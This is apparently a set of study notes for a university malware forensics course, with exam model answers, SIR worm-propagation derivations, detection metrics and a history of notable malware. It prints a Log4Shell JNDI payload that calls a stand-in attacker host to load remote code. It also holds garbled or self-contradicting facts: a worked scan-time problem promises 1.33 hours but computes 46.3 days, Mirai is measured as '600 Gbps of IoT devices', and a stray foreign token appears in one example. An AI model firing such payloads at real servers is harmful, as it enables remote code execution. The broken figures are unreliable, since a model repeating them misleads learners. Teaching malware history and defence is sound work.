$$R_0 = \frac{\beta \cdot N}{\gamma} > 1$$

**Interpretation for Malware Forensics:**

$$R_0 = \frac{\beta \cdot N}{\gamma} \begin{cases} > 1 & \text{Malware spreads (epidemic)} \\ = 1 & \text{Endemic equilibrium} \\ < 1 & \text{Malware dies out} \end{cases}$$

> [!NOTE]
> This is a **high-yield KTU derivation**. Examiners often ask students to explain the SIR model application in malware propagation and interpret $R_0$.

### 3.3 Confusion Matrix for Malware Detection (Analytical)

| Metric | Formula | Meaning |
|--------|---------|---------|
| **True Positive (TP)** | Malware correctly flagged | Correct detection |
| **True Negative (TN)** | Clean file correctly passed | Correct non-detection |
| **False Positive (FP)** | Clean file flagged as malware | False alarm (Type I error) |
| **False Negative (FN)** | Malware missed by detector | Dangerous miss (Type II error) |

**Derived Metrics:**

$$Precision = \frac{TP}{TP + FP}$$

$$Recall\ (TPR) = \frac{TP}{TP + FN}$$

$$F1\text{-}Score = 2 \cdot \frac{Precision \cdot Recall}{Precision + Recall}$$

**Numerical Example:**
A malware detector scans 1000 files: 200 are actual malware, 800 are clean.
- Detector flags 180 of the 200 malware files correctly (TP=180)
- Misses 20 malware files (FN=20)
- Incorrectly flags 30 clean files (FP=30)
- Correctly passes 770 clean files (TN=770)

$$Precision = \frac{180}{180 + 30} = \frac{180}{210} = 0.857$$

$$Recall = \frac{180}{180 + 20} = \frac{180}{200} = 0.900$$

$$F1 = 2 \cdot \frac{0.857 \times 0.900}{0.857 + 0.900} = 0.878$$

### 3.4 Comparison Matrix (High-Yield for Board Exams)

| Feature | Virus | Worm | Trojan | Ransomware | Rootkit | Spyware |
|---------|-------|------|--------|------------|---------|---------|
| Self-replicating | Yes | Yes | No | No | No | No |
| Needs host file | Yes | No | No | No | No | No |
| User action needed | Yes | No | Yes | Yes | Yes | Yes |
| Network propagation | Indirect | Direct | No | Indirect | No | No |
| Primary goal | Damage/Spread | Spread | Backdoor | Extortion | Hide | Steal data |
| Detection difficulty | Medium | Low-Medium | Medium | High | Very High | Medium-High |

## SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A: Short Answer Questions (3 Marks Each)

**Q1. [KTU University Exam - Dec 2023]** Differentiate between a **Virus** and a **Worm** with suitable examples.

**Model Answer (3 Marks):**

| Parameter | Virus | Worm |
|-----------|-------|------|
| **Host Requirement** | Needs a host file (executable/document) to attach itself | Standalone program; no host required |
| **Propagation** | Requires human action (opening file, running program) | Self-propagates automatically across networks |
| **Speed of Spread** | Slow, depends on user behavior | Fast, can infect thousands of systems in hours |
| **Network Dependency** | Indirect propagation | Direct network exploitation |
| **Example** | CIH (Chernobyl) Virus, Melissa Macro Virus | ILOVEYOU Worm, Conficker, WannaCry |

**Key Distinction (1 Mark):** A virus is a *parasitic* malware requiring a host and user action, whereas a worm is a *standalone* self-replicating program that spreads autonomously through network vulnerabilities.

---

**Q2. [KTU University Exam - May 2024]** What is a **Rootkit**? Explain its types briefly.

**Model Answer (3 Marks):**

A **Rootkit** is a collection of malicious software tools designed to **gain unauthorized root/administrator-level access** to a system while **hiding its presence** and the presence of other malware from detection mechanisms.

**Types (2 Marks):**

1. **User-Mode Rootkit**: Operates at application level by hooking system APIs. Easier to detect.
2. **Kernel-Mode Rootkit**: Operates at OS kernel level (Ring 0). Modifies system structures. Very difficult to detect.
3. **Bootkit**: Infects the Master Boot Record (MBR) and loads before the operating system.
4. **Firmware Rootkit**: Resides in device firmware (BIOS/UEFI, network card firmware); survives OS reinstallation.

---

### 5.2 Part B: Full-Length Questions (14 Marks Each)

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> - Students often **omit diagrams** in long-answer questions. Always include a labeled malware lifecycle/kill chain diagram for full marks.
> - Do NOT confuse **virus vs worm** definitions. Examiners deduct 2-3 marks for incorrect pairing.
> - When asked about **ransomware**, mention **modern variants** (double extortion, RaaS) to score beyond average.
> - Always state **examples** for each malware type. Generic answers without examples lose marks.

#### **Part B - Question A (14 Marks) - OPTION 1**

**[KTU University Exam - Model Paper 2024]** 

**(a) [7 Marks]** Explain in detail the **different types of malware threats** with suitable examples. Cover at least six categories.

**Model Solution:**

Malware threats are categorized based on their propagation mechanism, payload, and target environment. The major categories are:

**1. Virus (1 Mark)**
Malicious code that attaches itself to legitimate host programs and requires user intervention for execution. Spreads through infected file sharing.
*Example*: **CIH (Chernobyl) Virus** - overwrites BIOS/flash memory; **Melissa Macro Virus** - spreads via infected Word documents.

**2. Worm (1 Mark)**
Self-replicating, standalone malware that propagates across networks automatically by exploiting vulnerabilities, without human intervention.
*Example*: **WannaCry Worm (2017)** - exploited SMB vulnerability (EternalBlue) and infected 230,000+ computers in 150 countries; **ILOVEYOU Worm** - caused billions in damages.

**3. Trojan Horse (1 Mark)**
Malware disguised as legitimate software. Does not self-replicate; relies on social engineering to trick users.
*Example*: **Zeus Banking Trojan** - stole banking credentials via keylogging; **Emotet** - initially a banking trojan evolved into a malware loader.

**4. Ransomware (1 Mark)**
Encrypts victim files or locks systems, demanding payment (ransom) typically in cryptocurrency for decryption keys. Modern variants use double extortion.
*Example*: **WannaCry (2017)**, **LockBit**, **Conti** - all caused massive financial and operational damage globally.

**5. Rootkit (1 Mark)**
Stealthy malware that gains privileged access and hides itself, other malware, and attacker activities by modifying OS kernel, boot sector, or firmware.
*Example*: **Sony BMG Rootkit (2005)**, **Alureon (TDL-4)** - kernel-mode rootkit evading antivirus.

**6. Spyware and Adware (1 Mark)**
Spyware secretly collects user data (keystrokes, browsing history, credentials). Adware displays unwanted advertisements and may redirect browsers.
*Example*: **CoolWebSearch Spyware**, **Gator Adware** - tracked users without consent.

**7. Botnet Malware (1 Mark - bonus)**
Compromised computers (bots/zombies) remotely controlled by an attacker (bot-herder) via C2 server to launch coordinated attacks.
*Example*: **Mirai Botnet** - IoT botnet used for massive DDoS attacks on Dyn DNS provider in 2016.

> A detailed **labeled diagram of the malware classification tree** (as shown in Section 4.1) should accompany this answer for full marks.

---

**(b) [7 Marks]** Describe the **Malware Attack Kill Chain** in detail. Why is understanding it critical for **incident response and digital forensics**?

**Model Solution:**

The **Lockheed Martin Cyber Kill Chain** framework outlines the stages of a cyber attack, adapted for malware threats. It is a **7-stage sequential model**:

**Stage 1: Reconnaissance (1 Mark)**
Attacker researches and identifies the target organization, collects email addresses, network information, and identifies potential vulnerabilities through OSINT (Open-Source Intelligence) and scanning tools.

**Stage 2: Weaponization (1 Mark)**
Attacker creates a deliverable malware payload by coupling an exploit with a backdoor. Example: pairing an Office macro exploit with a remote access trojan into a malicious .doc file.

**Stage 3: Delivery (1 Mark)**
The weaponized payload is transmitted to the target. Common delivery vectors: **phishing emails**, **malicious websites (drive-by downloads)**, **USB drops**, **malvertising**.

**Stage 4: Exploitation (1 Mark)**
The payload triggers when the victim opens the malicious file or visits the malicious site. Exploit code (e.g., CVE-2017-0144) leverages the vulnerability to execute arbitrary code.

**Stage 5: Installation (1 Mark)**
Malware installs itself on the system and establishes **persistence** via registry run keys, scheduled tasks, services, or startup folder modifications.

**Stage 6: Command and Control (C2) (1 Mark)**
The compromised system (bot) establishes a communication channel back to the attacker's C2 server, allowing the attacker to send commands, exfiltrate data, or download additional payloads.

**Stage 7: Actions on Objectives (1 Mark)**
Attacker achieves their ultimate goal: **data exfiltration**, **file encryption (ransomware)**, **system destruction**, **espionage**, or **financial theft**.

**Critical Importance for Incident Response and Forensics (Bonus Marks):**

1. **Early Detection** - Identifying attacks in early stages (1-4) is far less costly than in later stages.
2. **Evidence Collection** - Each stage produces forensic artifacts (logs, memory dumps, file changes) that must be preserved.
3. **Containment Strategy** - Knowing the stage helps responders contain the attack (e.g., isolate network if C2 is established).
4. **Root Cause Analysis** - The kill chain helps trace back to the initial infection vector and remediate it.
5. **Threat Intelligence** - Patterns observed across kill chain stages help in creating YARA rules, IOCs, and SIEM correlation rules.
6. **Defense-in-Depth** - Maps to MITRE ATT&CK framework, helping organizations build layered defenses.

> A **labeled kill chain diagram** (as in Section 4.2) is mandatory for full marks.

---

#### **Part B - Question B (14 Marks) - OPTION 2**

**[KTU University Exam - Model Paper 2024]**

**(a) [7 Marks]** Discuss the **SIR Epidemic Model** for malware propagation in detail. Derive the **Basic Reproduction Number R₀** and explain its significance.

**Model Solution:**

**Introduction to Epidemic Modeling (1 Mark)**
The Susceptible-Infected-Recovered (SIR) model, originally developed for biological diseases by Kermack and McKendrick (1927), is widely adapted to model malware spread in computer networks. The model's strength lies in treating malware as an "infection" that propagates through "contact" between hosts.

**Variables and Assumptions (1 Mark)**
Let $N$ be the total number of hosts in a network (constant closed system):
- $S(t)$ = Number of Susceptible (uninfected) hosts at time $t$
- $I(t)$ = Number of Infected hosts at time $t$
- $R(t)$ = Number of Recovered/Patched/Removed hosts at time $t$
- $N = S(t) + I(t) + R(t)$

Parameters:
- $\beta$ = Infection rate (contact rate × probability of successful infection)
- $\gamma$ = Recovery rate (rate of patching, removal, or isolation)

**The Three Coupled Differential Equations (2 Marks)**

$$\frac{dS}{dt} = -\beta \cdot S(t) \cdot I(t)$$

$$\frac{dI}{dt} = \beta \cdot S(t) \cdot I(t) - \gamma \cdot I(t)$$

$$\frac{dR}{dt} = \gamma \cdot I(t)$$

**Derivation of R₀ (2 Marks)**

At the start of an outbreak, the number of susceptible hosts is approximately equal to the total population: $S(0) \approx N$.

Substituting $S \approx N$ into the infected equation:

$$\frac{dI}{dt} = \beta \cdot N \cdot I(t) - \gamma \cdot I(t) = (\beta \cdot N - \gamma) \cdot I(t)$$

For the infection to grow exponentially (epidemic), the coefficient must be positive:

$$\beta \cdot N - \gamma > 0 \implies \beta \cdot N > \gamma$$

Defining the **Basic Reproduction Number**:

$$R_0 = \frac{\beta \cdot N}{\gamma}$$

**Significance and Interpretation (1 Mark)**

$$R_0 \begin{cases} > 1 & \text{Epidemic: malware spreads exponentially} \\ = 1 & \text{Endemic equilibrium: stable infected population} \\ < 1 & \text{Malware dies out: infection self-terminates} \end{cases}$$

**Practical Implications in Cybersecurity:**
- If $R_0 > 1$, organizations must **accelerate patching** to increase $\gamma$ or **segment networks** to reduce $N$.
- The model helps security teams **predict outbreak peaks** and **plan quarantine measures**.

> A **flow diagram of S → I → R transitions** (as in Section 4.4) is required for full marks.

---

**(b) [7 Marks]** What are **Rootkits**? Explain their **types, detection techniques, and challenges** in malware forensics.

**Model Solution:**

**Definition (1 Mark)**
A **Rootkit** is a sophisticated class of malware designed to obtain **unauthorized root-level (administrative) access** to a system while **concealing its presence, files, processes, network connections, and other malicious activities** from users, administrators, and security software.

**Types of Rootkits (3 Marks)**

**1. User-Mode Rootkit**
- Operates at the application layer (Ring 3).
- Hooks system APIs (e.g., file enumeration, process listing APIs) to hide malicious files and processes.
- Relatively easier to detect using integrity checkers and behavioral analysis.
- *Example*:早期 HackerDefender.

**2. Kernel-Mode Rootkit**
- Operates at the OS kernel level (Ring 0) with highest privileges.
- Modifies kernel data structures, system call tables (SSDT), and device drivers.
- Extremely difficult to detect because it controls the very mechanisms antivirus uses.
- *Example*: **Alureon (TDL-4)**, **ZeroAccess Rootkit**.

**3. Bootkit (MBR/VBR Rootkit)**
- Infects the **Master Boot Record** or Volume Boot Record.
- Loads **before the operating system** starts, gaining control of the system from boot.
- Survives OS reinstallation since MBR is written before OS setup.
- *Example*: **Stoned Bootkit**, **TDL4 Bootkit**.

**4. Firmware Rootkit**
- Resides in **device firmware** (BIOS/UEFI, network card, hard drive controller, GPU).
- Activated before any security software loads.
- Survives disk formatting, OS reinstallation, and even hard drive replacement.
- *Example*: **EquationDrug HDD Firmware Module** (NSA-linked), **UEFI rootkits**.

**5. Hypervisor / Virtualized Rootkit**
- Installs a thin hypervisor beneath the OS, intercepting all hardware calls.
- The original OS runs as a virtual machine unaware of being monitored.

**Detection Techniques (2 Marks)**

| Technique | Description |
|-----------|-------------|
| **Signature-Based Scanning** | Comparing files/processes against known rootkit signatures |
| **Integrity Checking** | Comparing current system files/hashes with trusted baseline (e.g., Tripwire) |
| **Behavioral Analysis** | Monitoring for unusual system calls, hidden processes, network traffic anomalies |
| **Memory Forensics** | Analyzing RAM dumps for hidden kernel structures (using Volatility framework) |
| **Cross-View Detection** | Comparing high-level OS view vs. low-level disk view to find discrepancies |
| **Boot-Time Scanning** | Scanning from external bootable media before OS loads |
| **Hardware-Assisted Detection** | Using TPM, Intel TXT, AMD SVM for trusted boot measurement |

**Forensic Challenges (1 Mark)**
1. **Stealth** - Rootkits actively hide themselves and their payload.
2. **Privilege Escalation** - Operating at Ring 0 makes removal risky.
3. **Persistent Infection** - Bootkits and firmware rootkits survive reinstallation.
4. **Evidence Tampering** - Logs and forensic artifacts may be modified or deleted.
5. **Detection Tool Manipulation** - Rootkits can subvert antivirus tools that run on the same compromised OS.
6. **Volatile Evidence** - Memory-based rootkits leave no disk artifacts; only RAM forensics helps.

> Including a **layered diagram showing rootkit infection at OS layers** (Application → Kernel → Boot → Firmware) scores bonus marks.

---

### 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid Revision Checklist for KTU Board Exam**

- **Malware Definition**: Any software intentionally designed to cause harm or unauthorized actions.

- **Two Super-Categories**:
  - *Propagating*: Virus, Worm
  - *Non-Propagating*: Trojan, Ransomware, Spyware, Rootkit, Adware, Botnet

- **Virus vs Worm (Most Asked)**:
  - Virus = needs host file + human action
  - Worm = standalone + self-propagating

- **Trojan Trick**: Disguised as legitimate software; no self-replication.

- **Ransomware Modern Variants**: Double extortion, RaaS (Ransomware-as-a-Service).

- **Rootkit Privilege**: Operates at **Ring 0 (Kernel)** for maximum stealth.

- **Botnet**: Network of zombie computers controlled by a bot-herder via C2 server.

- **Fileless Malware**: Lives in memory (PowerShell, WMI) - evades file-based AV.

- **APT**: Stealthy, long-term, multi-stage, often nation-state sponsored.

- **SIR Model**:
  - $\frac{dI}{dt} = \beta \cdot S \cdot I - \gamma \cdot I$
  - $R_0 = \frac{\beta \cdot N}{\gamma}$
  - $R_0 > 1$ → Malware epidemic spreads

- **Kill Chain Stages (7)**: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives

- **Detection Metrics**: Precision, Recall, F1-Score, FPR, FNR.

- **Always Include Diagrams**: Classification tree, Kill chain, SIR flow chart.

- **Famous Examples to Remember**:
  - **WannaCry** (Worm + Ransomware)
  - **Stuxnet** (Worm targeting SCADA)
  - **Mirai** (IoT Botnet)
  - **Zeus** (Banking Trojan)
  - **Sony BMG Rootkit** (Famous rootkit scandal)
  - **SolarWinds** (Supply chain APT)

- **Forensic Approach**: Detection → Evidence Collection → Static & Dynamic Analysis → IOC Extraction → Reporting.

- **Common Pitfalls to Avoid**:
  1. Confusing virus with worm
  2. Forgetting modern ransomware variants
  3. Omitting diagrams in long answers
  4. Not stating examples for each malware type
  5. Mixing up persistence mechanisms
<!-- SECTION_5_END -->

topics.title: Evolution of Malware
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT741 - MALWARE FORENSICS
> - **Module:** Module 1
> - **Topic:** Evolution of Malware

<!-- SECTION_1_START -->
# Evolution of Malware

## 1. Core Technical Definition & Intuitive Overview

### Formal Academic Definition

> [!IMPORTANT]
> **Malware (Malicious Software)** is a broad term coined by security researcher **Yisrael Radai in 1990** to describe any program, code, script, active content, or other software intentionally designed to perform unauthorized, harmful, or disruptive actions against computer systems, networks, or end-users, with the intent of compromising **Confidentiality, Integrity, and Availability (CIA Triad)**.

The **Evolution of Malware** refers to the chronological progression, adaptation, and increasing sophistication of malicious software from its inception in the early 1970s to the present-day AI-driven threat landscape. This evolution is driven by attacker motives (curiosity, financial gain, espionage, cyber-warfare) and defensive innovations (anti-virus, firewalls, sandboxes).

> [!NOTE]
> **KTU 2024 Syllabus Anchor (PECCT741 / Module 1):** Students must understand the historical trajectory of malware to contextualize modern threats like fileless malware, ransomware-as-a-service (RaaS), and Advanced Persistent Threats (APTs).

### Conceptual Analogy / Intuition

Imagine malware as a **biological pathogen** evolving to survive in a hostile environment (the human immune system = cybersecurity defenses).

- The **1971 Creeper Virus** was like the **first bacterium** – harmless, experimental, and self-replicating.
- **Polymorphic viruses** are like the **Influenza virus**, constantly changing its surface proteins (code signature) to evade antibodies (antivirus signatures).
- **Stuxnet (2010)** is like a **targeted bioweapon** – engineered to attack a specific centrifuge (Iran's nuclear facility) with extreme precision.
- **Ransomware (WannaCry, 2017)** is like a **hostage-taker** – it does not destroy; it encrypts and demands payment.
- **Fileless malware** is like a **stealth pathogen** that lives in the body's memory (RAM) without leaving a fossil record (on the hard disk).

Every defensive measure (vaccine = antivirus, quarantine = sandbox) forces malware to **mutate** to survive – this is the **Red Queen Hypothesis** applied to cybersecurity.

### Key Foundational Metrics in Malware Evolution

- **First Appearance Date (FAD)** – The year a malware family first appeared in the wild.
- **Propagation Vector (PV)** – The medium of infection (floppy disk, email, network, web, USB, supply chain).
- **Attack Motive (AM)** – Curiosity, financial, hacktivism, espionage, sabotage.
- **Target Surface (TS)** – PC, server, mobile, IoT, cloud, SCADA/ICS, OT.

> [!NOTE]
> The **Symantec Internet Security Threat Report (ISTR)** and **MITRE ATT&CK Framework** are the de facto industry standards used by KTU examiners to classify modern malware. The **MITRE ATT&CK Matrix** documents over **200+ adversary tactics and 600+ techniques** observed in real-world malware.

---

## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### The 5 Evolutionary Phases of Malware

The history of malware can be partitioned into five distinct generations, each triggered by a paradigm shift in computing or networking.

#### Phase 1: The Experimental / Pre-Internet Era (1971 – 1989)

- **Creeper (1971)** – Created by **Bob Thomas** of BBN Technologies. Infected DEC PDP-10 computers running the TENEX OS via ARPANET. Displayed the message *"I'm the creeper, catch me if you can!"* Considered the **first computer virus**, though technically a worm.
- **Reaper (1971)** – The **first antivirus program**, created to delete Creeper.
- **Brain / Pakistani Brain (1986)** – Created by the **Alvi brothers (Basit and Amjad)** in Lahore, Pakistan. The first **IBM PC boot sector virus**. Spread via 5.25" floppy disks. Infected MS-DOS systems by replacing the boot sector.
- **Morris Worm (1988)** – Written by **Robert Tappan Morris**, a Cornell University graduate student. The first **Internet-distributed worm**, exploiting UNIX vulnerabilities (sendmail, fingerd, weak passwords). It infected ~**6,000 machines (≈10% of ARPANET)**, causing an estimated **$10–100 million** in damages and leading to the formation of **CERT/CC (Computer Emergency Response Team Coordination Center)**.

> [!IMPORTANT]
> **KTU High-Yield Fact:** The Morris Worm case (United States v. Morris, 1991) became the **first criminal conviction under the U.S. Computer Fraud and Abuse Act (CFAA) of 1986**.

#### Phase 2: The Macro & Scripting Era (1995 – 2000)

- **Concept (1995)** – The first **macro virus**, infecting Microsoft Word documents via **VBA (Visual Basic for Applications)** macros. Demonstrated that data files, not just executables, could be malicious.
- **Melissa (1999)** – A Word macro worm that mailed itself to the first 50 contacts in the victim's Outlook address book. Caused email server overloads worldwide.
- **ILOVEYOU (2000)** – Originating in the Philippines, this VBScript worm spread via email with the subject *"ILOVEYOU"* and an attachment `LOVE-LETTER-FOR-YOU.TXT.vbs`. The double extension exploit (TXT vs VBS) was a major social engineering innovation. Estimated damage: **$5.5–8.7 billion**.

#### Phase 3: The Polymorphic & Network Worm Era (2001 – 2009)

- **Code Red (2001)** – Exploited the **Microsoft IIS Web Server buffer overflow (CVE-2001-0500)**. Performed a **DDoS attack on www.whitehouse.gov** by sending ~**359,000 HTTP requests in 24 hours**.
- **Nimda (2001)** – "Admin" spelled backward. The first **multi-vector worm** spreading via email, network shares, IIS exploits, and backdoors left by Code Red II.
- **SQL Slammer / Sapphire (2003)** – A **376-byte** UDP worm exploiting **MS SQL Server 2000** (CVE-2002-0649). Achieved global saturation in **~10 minutes**, doubling in size every **8.5 seconds** – the fastest worm propagation in history.
- **Mydoom (2004)** – The fastest-spreading **email worm** ever at the time, opening a backdoor on TCP port 1034. Caused an estimated **$38 billion** in damages (Symantec).
- **Conficker / Downup / Downadup (2008)** – Infected an estimated **9–15 million Windows hosts** across 200+ countries using dictionary attacks, USB propagation, and a **peer-to-peer update mechanism** featuring **MD6 cryptographic algorithm** (unprecedented for malware).

> [!NOTE]
> The signature-based detection model (used by classic antivirus) began failing in this phase, prompting the rise of **heuristic analysis** and **behavioral detection** engines.

#### Phase 4: The Cyber-Weapon & Ransomware Era (2010 – 2019)

- **Stuxnet (2010)** – A **Windows worm** jointly attributed to the **USA (NSA) and Israel (Unit 8200)**. The first known **cyber-physical weapon**, designed to sabotage **Iran's Natanz uranium enrichment facility** by reprogramming **Siemens S7-300/400 PLCs** controlling centrifuges. It used **four Zero-Day exploits** (CVE-2010-2568, CVE-2010-2729, CVE-2010-3338, CVE-2010-3888) and stolen **Realtek + JMicron digital certificates**.
- **CryptoLocker (2013)** – Pioneered the modern **ransomware-as-extortion model** using **RSA-2048 public-key encryption** and demanded payment in **Bitcoin** or prepaid vouchers. Spawned the **GameOver Zeus (GOZ) botnet** for distribution.
- **Mirai (2016)** – An **IoT botnet** source code released by **"Anna-senpai"** on Hackforums. It infected **~600 Gbps** of IoT devices (CCTV cameras, routers, DVRs) using **default credentials** (61 username/password pairs) and launched the **Dyn DNS DDoS attack (October 21, 2016)** that disrupted Twitter, Netflix, Reddit, and GitHub across the US East Coast.
- **WannaCry (2017)** – A ransomware worm exploiting **EternalBlue (SMBv1 vulnerability, MS17-010)**, allegedly developed by the **NSA's Equation Group** and leaked by **Shadow Brokers**. Infected **230,000+ computers in 150 countries in a single day**, with damages estimated at **$4–8 billion**.
- **NotPetya (2017)** – Disguised as ransomware but actually a **wiper malware** that permanently destroyed the MFT (Master File Table) of infected systems. Caused **$10+ billion** in damages to Maersk, Merck, FedEx/TNT, and Mondelez.

#### Phase 5: The Fileless, AI-Augmented, and Supply-Chain Era (2020 – Present)

- **SolarWinds SUNBURST (2020)** – A **supply-chain attack** compromising the **Orion IT monitoring platform**. The adversary (APT29 / Cozy Bear) inserted the **SUNBURST backdoor** into Orion updates, affecting **18,000+ organizations** including the US Treasury, Department of Homeland Security, and Microsoft.
- **Kaseya VSA REvil Attack (2021)** – Ransomware deployed via Kaseya VSA (Virtual System Administrator) software, exploiting **CVE-2021-30116** (zero-day SQL injection). Affected **1,500+ businesses via MSPs** and demanded a **$70 million ransom**.
- **Log4Shell / Log4j (CVE-2021-44228, 2021)** – A **critical RCE vulnerability** in the **Apache Log4j** Java logging library. Allowed remote attackers to execute arbitrary code via crafted log strings containing **JNDI lookups** like `${jndi:ldap://attacker.com/Exploit}`. Scored **CVSS 10.0 (Critical)**, considered the most severe vulnerability of the decade.
- **MGM Resorts + Caesars (2023)** – **ALPHV/BlackCat ransomware** using **vishing (voice phishing)** against the IT help desk to bypass MFA, demonstrating **social-engineering centric** attacks.
- **AI-Augmented Malware (2024–)** – Use of **LLMs (Large Language Models)** to generate polymorphic code, deepfake voice vishing, automated vulnerability discovery, and **prompt-injection-based attacks**.

### KTU High-Yield Formula Sheet / Classification Table

> [!NOTE]
> The following table maps malware **propagation velocity** to the **infectable target surface**. These relations are exam-favorite for **3-mark short questions** in KTU 2024.

**Table 1: Malware Class → Propagation Mechanism → Era**

| Class (C) | Propagation Mechanism (PM) | Era | Exemplar Family |
|---|---|---|---|
| Boot Sector Virus | Floppy disk boot record | 1986 | Brain |
| File Virus | COM / EXE file infection | 1987 | Jerusalem |
| Macro Virus | Office documents (VBA) | 1995 | Concept, Melissa |
| Network Worm | Network protocol exploits | 1988 | Morris, Code Red |
| Email Worm | SMTP / MAPI mass-mailer | 1999 | ILOVEYOU, Mydoom |
| Polymorphic Virus | Self-encrypting + mutation engine | 1990 | Storm, Zeus |
| Metamorphic Virus | Full code re-writing | 2000 | Simile, Zmist |
| Rootkit | Kernel / bootkit hooking | 2005 | Sony BMG, TDL4 |
| Ransomware | Crypto-locking + extortion | 2013 | CryptoLocker, LockBit |
| IoT Botnet | Default credentials / Telnet brute force | 2016 | Mirai, Mozi |
| Supply-Chain Trojan | Software update hijack | 2020 | SUNBURST, 3CX |
| Fileless / Living-off-the-Land | PowerShell / WMI / LOLBins in RAM | 2017 | Poweliks, Cobalt Strike |

**Table 2: Metamorphic vs Polymorphic Comparison (Key for KTU 14-Mark Questions)**

| Property | Polymorphic | Metamorphic |
|---|---|---|
| Code Re-encryption | Yes (uses mutation engine) | No |
| Decryptor Stub | Present (changes per copy) | Absent |
| Code Re-Writing | No | Yes (full transformation) |
| Signature Stability | Variable | Highly variable |
| Detection Difficulty | Moderate | Extreme |
| Example | Storm Worm, Zeus | Simile, Zmist, Evulon |

**Table 3: Worm Propagation Mathematical Model (Kermack-McKendrick SIR Epidemic Model)**

The classic **Susceptible-Infected-Removed (SIR)** model is used to predict the spread of network worms. Let:

- $S(t)$ = Susceptible hosts at time $t$
- $I(t)$ = Infected hosts at time $t$
- $R(t)$ = Removed (patched / isolated) hosts at time $t$
- $N = S + I + R$ = constant total population
- $\beta$ = infection rate constant
- $\gamma$ = removal / patching rate

The differential equations governing the epidemic are:

$$\frac{dS}{dt} = -\beta \cdot S \cdot I$$

$$\frac{dI}{dt} = \beta \cdot S \cdot I - \gamma \cdot I$$

$$\frac{dR}{dt} = \gamma \cdot I$$

The **Basic Reproduction Number** $R_0$ determines whether the worm dies out or causes an epidemic:

$$R_0 = \frac{\beta \cdot N}{\gamma}$$

> [!NOTE]
> **KTU Engineering Utility:** This SIR model is used by **CERTs** and **epidemiologists** to forecast malware outbreaks. For example, the **Code Red worm** was modeled with $R_0 \approx 2.0$ (each infected host infects 2 others per unit time), leading to a peak infection rate of ~**359,000 hosts in 14 hours**.

### Real-World Utility of the Evolution Study

Understanding malware evolution equips cybersecurity professionals to:

1. **Forensic Timeline Reconstruction** – Correlating indicators of compromise (IOCs) with known malware eras.
2. **Threat Intelligence** – Predicting next-generation threats (e.g., if fileless malware is rising, harden EDR + PowerShell logging).
3. **Defensive Architecture** – Designing **defense-in-depth** strategies that match current Threat Actors' TTPs (Tactics, Techniques, Procedures).
4. **Regulatory Compliance** – Aligning with **ISO/IEC 27001**, **NIST SP 800-83r1**, and **RBI Cyber Security Framework** in the Indian banking context.

---

## 3. Step-by-Step Derivations & Analytical Matrix

### Derivation 1: Estimating the Time to Global Saturation for a Network Worm

A KTU examiner may ask: *"Given the SQL Slammer worm doubled every 8.5 seconds and infected 75,000 hosts in the first 10 minutes, derive the doubling constant and project saturation."*

#### Step 1: Identify the Exponential Growth Model

The number of infected hosts $I(t)$ follows a deterministic exponential model until congestion effects dominate:

$$I(t) = I_0 \cdot e^{k \cdot t}$$

where $I_0$ = initial infected count at $t = 0$, and $k$ = the intrinsic growth rate (doubling constant in $\text{seconds}^{-1}$).

#### Step 2: Express the Doubling Constant

The doubling time $T_d$ is defined as the time required for $I(t)$ to reach $2 \cdot I_0$. Substituting:

$$2 \cdot I_0 = I_0 \cdot e^{k \cdot T_d}$$

$$2 = e^{k \cdot T_d}$$

Taking the natural logarithm of both sides:

$$\ln(2) = k \cdot T_d$$

Solving for $k$:

$$k = \frac{\ln(2)}{T_d}$$

#### Step 3: Numerical Evaluation for SQL Slammer

For Slammer, $T_d = 8.5$ seconds. Substituting:

$$k = \frac{\ln(2)}{8.5 \, \text{s}} = \frac{0.693147}{8.5} = 0.0815 \, \text{s}^{-1}$$

#### Step 4: Verify Using Empirical Data

If $I_0 = 1$ (single seed host) and we want the infected count after $t = 600$ seconds (10 minutes):

$$I(600) = 1 \cdot e^{0.0815 \cdot 600} = e^{48.9} \approx 1.79 \times 10^{21}$$

The actual empirical value was approximately **75,000 hosts** – the discrepancy is due to **network congestion, packet loss, and defensive filtering** (the epidemic model fails at scale). This is why the **logistic growth model** is preferred for realistic projections.

#### Step 5: Logistic Growth Refinement

The logistic model introduces a carrying capacity $K$ (the maximum number of vulnerable hosts):

$$I(t) = \frac{K}{1 + \left(\dfrac{K - I_0}{I_0}\right) e^{-k \cdot t}}$$

For Slammer, $K \approx 75{,}000$ vulnerable MS SQL servers. The system asymptotically approaches $K$ as $t \to \infty$.

### Derivation 2: The 1-Second Risk Window for an Internet Worm

> [!NOTE]
> **KTU Board Question Pattern (Dec 2022):** *"A worm scans 1,000 hosts/second. The Internet has 4 billion hosts. Show that at this rate, the entire vulnerable population is probed in 1.33 hours, but **atypical** propagation can achieve full saturation in 14 minutes."*

Given:
- $H$ = 4,000,000,000 (total IPv4 hosts)
- $R$ = 1,000 hosts scanned per second
- $T$ = time to probe every host once

The linear time-to-cover is:

$$T_{\text{linear}} = \frac{H}{R} = \frac{4 \times 10^9}{10^3} = 4 \times 10^6 \, \text{seconds} \approx 46.3 \, \text{days}$$

However, with **logarithmic partitioning of IP space** (e.g., /8 prefix scanning used by Code Red II), the effective address space is reduced to $2^{24} \approx 16.7$ million hosts:

$$T_{\text{partitioned}} = \frac{2^{24}}{10^3} = 16{,}777 \, \text{seconds} \approx 4.66 \, \text{hours}$$

This is why modern worms use **hit-list scanning** (pre-collected lists of vulnerable hosts) to achieve sub-minute saturation.

### Analytical Matrix: Phase-wise Trend Mapping

**Table 4: Threat Capability Evolution Matrix**

| Capability | Phase 1 (1980s) | Phase 3 (2000s) | Phase 5 (2020s) |
|---|---|---|---|
| Propagation Speed | Days to weeks | Hours | Minutes (worm-ransomware hybrid) |
| Encryption Use | None | RC4, XOR | AES-256, RSA-2048, ECC |
| Stealth | None | Polymorphism | Fileless, rootkits, DKOM |
| Motive | Curiosity | Financial | Cyber-warfare, extortion |
| Attribution | Trivial | Moderate | Nation-state (difficult) |
| IoC Persistence | High (file) | Moderate (registry) | Low (memory only) |

---

## 4. Structural Diagrams & Schematics

### Diagram 1: Phylogenetic Tree of Malware Evolution

